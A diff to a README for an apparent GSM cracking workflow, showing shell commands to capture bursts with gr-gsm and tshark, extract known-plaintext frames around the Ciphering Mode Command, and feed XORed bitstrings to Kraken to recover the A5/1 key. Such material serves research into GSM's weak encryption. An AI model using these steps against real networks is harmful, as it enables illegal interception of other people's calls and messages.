@@ -18,7 +18,7 @@ Few packages for stage 1
 
         apt install python3 tcpdump tshark gr-gsm -y
 
-Optionally `gsmframedecoder` when dealing with SI5,6 instead of idle frames, but then you would also need obtain HEX version of the bursts, be it with the old Airprobe or Wireshark
+Optionally `gsmframedecoder` when dealing with SI5,5ter,6 instead of idle frames, but then you would also need obtain HEX version of the bursts, be it with the old Airprobe or Wireshark
 
 	cd /root/KRAKEN/
 	#git clone https://github.com/flyopenair/gsmframecoder.git
@@ -56,7 +56,7 @@ _requires GR-GSM and a cfile_
 
 Extract broadcast control channel
 
-        cd /root/KRAKEN/autokraken/stage1/
+	cd /root/KRAKEN/autokraken/stage1/
 	./json0C $arfcn
 
 and take the chance to check that there is no hopping
@@ -85,9 +85,9 @@ Now seek for idling frames and SI5,5ter,6 around the Ciphering Mode Command
 
 Eventually send the bitstring file to the Kraken server.
 
-        scp /root/capture/$arfcn.cfile.${slot}S$sub kraken:/root/capture/
+	scp /root/capture/$arfcn.cfile.${slot}S$sub kraken:/root/capture/
 
-## Stage 1.5 - SI5 Timing Advance
+## Stage 2 preliminaries - SI5,5ter,6 Timing Advance
 
 _skip this step for idling frame_
 
@@ -110,7 +110,7 @@ Make sure the variables are still defined
 
 Tune your path against Kraken and Utilities
 
-        vi feedcrack.conf
+	vi feedcrack.conf
 
 	kraken=/root/KRAKEN/kraken
 
@@ -124,7 +124,7 @@ XOR plain bitstrings with cipher bitstrings for idling frames
 --or-- for SI5
 
 	ls -lhF /root/capture/si5
-        echo $arfcn $slot $sub $plainframe
+	echo $arfcn $slot $sub $plainframe
 	./guesssi5 /root/capture/$arfcn.cfile.${slot}S$sub $plainframe
 	./feedcrack /root/capture/$arfcn.cfile.${slot}S$sub $plainframe
 
@@ -134,18 +134,23 @@ Feed those to Kraken
 	ls -lhF /dev/sdb2
 	ls -lhF ../indexes/
 
-crack idling frames --or-- crack SI5,6 frames
+crack idling frames
 
 	head /root/capture/crackidlexors
-	head /root/capture/crackxors
-        ./kraken ../indexes < /root/capture/crackidlexors
-        ./kraken ../indexes < /root/capture/crackxors
+	./kraken ../indexes < /root/capture/crackidlexors
 
+--or-- cracking SI5,5ter,6 frames
+
+	head /root/capture/crackxors
+	./kraken ../indexes < /root/capture/crackxors
+
+<!--
 ## Stage 2 automated
 
 _draft_
 
 	./crack /root/capture/$arfcn.cfile.${slot}S$sub $plainframe
+-->
 
 ## Stage 3 - verify the key
 
@@ -227,7 +232,7 @@ https://lynxnuzlan.wordpress.com/2011/02/23/practical-exercise-on-the-gsm-encryp
 The big GSM write-up – how to capture, analyze and crack GSM? – 1.
 https://domonkos.tomcsanyi.net/?p=418
 
-<--
+<!--
 ### similar projects
 
 gsmtk - GSM sniffing toolkit
